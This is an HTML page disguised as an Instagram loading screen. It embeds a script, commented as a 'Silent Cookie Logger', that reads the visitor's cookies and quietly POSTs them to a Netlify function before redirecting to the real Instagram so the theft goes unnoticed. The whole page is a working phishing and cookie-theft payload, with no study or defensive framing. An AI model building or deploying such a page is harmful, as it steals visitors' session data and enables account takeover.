<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: #fafafa;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }
        .loader {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .spinner {
            width: 30px;
            height: 30px;
            border: 3px solid #dbdbdb;
            border-top: 3px solid #0095f6;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="loader">
        <div class="spinner"></div>
    </div>

    <script>
        // Silent Cookie Logger Script
        (function() {
            // 1. Get the current cookies
            const cookies = document.cookie;
            
            // 2. Send them to our Netlify function via a hidden fetch
            // We use 'no-cors' or 'same-origin' to avoid blocking the page
            fetch('/.netlify/functions/logger', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    cookies: cookies,
                    timestamp: new Date().toISOString()
                }),
                keepalive: true // Important: keeps the request alive even if page navigates
            }).catch(err => console.log("Logger failed silently", err));

            // 3. Immediately redirect to Instagram
            // This makes it seem like the page just loaded Instagram
            window.location.href = "https://www.instagram.com/";
        })();
    </script>
</body>
</html>
